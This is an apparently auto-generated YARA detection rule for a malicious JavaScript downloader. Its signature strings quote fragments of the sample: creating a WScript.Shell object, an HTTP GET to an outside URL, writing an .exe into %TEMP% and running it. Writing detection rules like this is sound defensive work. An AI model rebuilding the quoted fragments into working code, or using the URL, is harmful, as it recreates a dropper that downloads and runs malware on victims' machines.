rule sig_20160401_3dfad574503b1f69cd02d684e09a1382 {
  meta:
    description = "datamaliciousorder - file 20160401_3dfad574503b1f69cd02d684e09a1382.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1980ddf001da1bb81fc2da7bb2417a0a9d286fc7bcf4e0f3ae9fbe98d74e38cd"

  strings:
    $s1  = "function PxKtm(IdoGwx, QkNn){OavMs = OavMs * 1; return IdoGwx - QkNn;};" fullword ascii
    $s2  = "var LlzQl = function PfNa() {return WScript[HlPvq](\"WScript\"+\".Shell\");}(), OjaGvb = 11;" fullword ascii
    $s3  = "KyUmd[KeiSh](\"G\" + \"ET\", \"http://asengineeringworks.in/n9wqo\", false);" fullword ascii
    $s4  = "if (KyUmd[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function BrGi() {return LlzQl[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"RtimGMWO.ex\" + \"e\";};" fullword ascii
    $s6  = "function QlCt(){return YqRy + \"\";};" fullword ascii
    $s7  = "function IexVmw() {return ((YoiLn == true) && (YoiLn == WaPte)) ? 1 : OavMs;};" fullword ascii
    $s8  = "var WaPte = false;" fullword ascii
    $s9  = "var CxyPk = false;" fullword ascii
    $s10 = "function MynEcs(){return 23;};" fullword ascii
    $s11 = "function XipVfi()" fullword ascii
    $s12 = "function DsIad(){return HlPvq;};" fullword ascii
    $s13 = "function FvmCmv(EulBgv) {var NfoPb = (1, 2, 3, 4, 5, EulBgv); return NfoPb;};" fullword ascii
    $s14 = "var IxWdw = new this[\"Date\"]();" fullword ascii
    $s15 = "YoiLn = true; " fullword ascii
    $s16 = "WaPte = true; " fullword ascii
    $s17 = "return PxKtm(AupOcb, CndAl);" fullword ascii
    $s18 = "}while (JuLun);" fullword ascii
    $s19 = "function WohHnh(DcrYe){LlzQl[\"R\"+\"un\"](DcrYe, OavMs, OavMs);};" fullword ascii
    $s20 = "var YoiLn = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}